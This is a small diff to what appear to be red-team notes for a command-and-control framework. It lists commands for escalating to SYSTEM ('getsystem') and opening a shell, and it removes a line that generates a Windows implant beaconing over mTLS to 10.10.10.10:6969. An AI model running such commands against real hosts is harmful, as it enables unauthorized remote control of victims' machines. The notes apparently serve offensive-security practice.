@@ -109,7 +109,6 @@ download
 
 // With Administrative and adble to get SeDebugPrivilege - by default uses spool.svc to getsystem 
 getsystem
-enerate beacon --mtls 10.10.10.10:6969 --arch amd64 --os windows --save 
 // Shell
 Shell // Comes with an OPSec warning by default for good reason
 // Exit shell, be patient wait 30 seconds
